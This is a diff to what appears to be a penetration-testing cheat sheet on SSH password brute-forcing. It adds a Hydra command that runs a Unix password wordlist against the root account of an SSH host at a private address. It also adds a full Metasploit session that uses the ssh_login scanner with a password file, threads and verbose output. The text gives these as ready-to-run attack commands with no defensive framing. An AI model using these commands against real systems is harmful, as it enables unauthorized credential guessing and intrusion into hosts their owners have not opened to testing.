@@ -1,6 +1,7 @@
 
 # Hydra 
 hydra -L user.txt -P password.txt 192.168.0.8 ssh
+hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.23.129:22 -t 4 -V
 
 # Medusa 
 
@@ -9,6 +10,16 @@ hydra -L user.txt -P password.txt 192.168.0.8 ssh
 
 
 # Metasploit
+
+root@kali:~# msfconsole 
+msf6 > search ssh 
+msf6 > use auxiliary/scanner/ssh/ssh_login 
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root 
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt 
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.23.129
+msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 10 
+msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true 
+msf6 auxiliary(scanner/ssh/ssh_login) > exploit
 
 
 # Patator 
